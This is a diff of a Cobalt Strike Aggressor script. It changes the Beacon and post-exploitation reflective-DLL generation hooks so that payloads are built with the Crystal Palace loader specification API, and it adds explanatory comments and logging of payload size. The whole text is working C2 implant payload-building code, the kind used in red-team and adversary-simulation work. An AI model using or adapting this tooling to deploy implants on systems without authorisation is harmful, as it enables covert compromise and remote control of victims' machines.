@@ -1,5 +1,9 @@
 debug ( 7 );
 
+# We need to pass the Beacon DLL to Crystal Palace and have it process it via the specification
+# file instead.  The first step is to ensure a copy of crystalpalace.jar exists inside the 
+# Cobalt Strike client directory (alongside cobaltstrike-client.jar).
+# Then we use the import keyword in Aggressor to access the required Java classes.
 import crystalpalace.spec.* from: crystalpalace.jar;
 import java.util.HashMap;
 
@@ -67,16 +71,21 @@ set BEACON_RDLL_GENERATE
 
     print_info ( "BEACON_RDLL_GENERATE" );
 
+    # Instead of reading the loader directly, we call the Crystal Palace Java API, providing the
+    # path to the specification file and the raw Beacon DLL.
     $spec_path = getFileProper ( script_resource ( "loader" ), "loader.spec" );
     $spec      = [ LinkSpec Parse: $spec_path ];
     $final     = [ $spec run: $beacon, [ new HashMap ] ];
 
+    # The output will be a PIC blob that contains the loader and Beacon DLL. If anything fails
+    # and the script returns $null, it tells Cobalt Strike to fallback to its default loader.
     if ( strlen ( $final ) == 0 )
     {
         warn ( "Failed to build payload" );
         return $null;
     }
 
+    print_info ( strlen ( $final ) );
     return $final;
 }
 
@@ -117,13 +126,22 @@ set BEACON_RDLL_GENERATE_LOCAL
         return $null;
     }
 
+    print_info ( strlen ( $final ) );
     return $final;
 }
 
+# ------------------------------------
+# $1 = DLL file name
+# $2 = DLL content
+# $3 = arch
+# $4 = parent Beacon ID
+# $5 = GetModuleHandle pointer
+# $6 = GetProcAddress pointer
+# ------------------------------------
 set POSTEX_RDLL_GENERATE
 { 
     local ( '$postex $arch $gmh $gpa $spec_path $spec $hash_map $final' );
-   
+ 
     $postex = $2;
     $arch   = $3;
     $gmh    = $5;
@@ -159,5 +177,6 @@ set POSTEX_RDLL_GENERATE
        return $null;
     }
 
+    print_info ( strlen ( $final ) );
     return $final;
 }
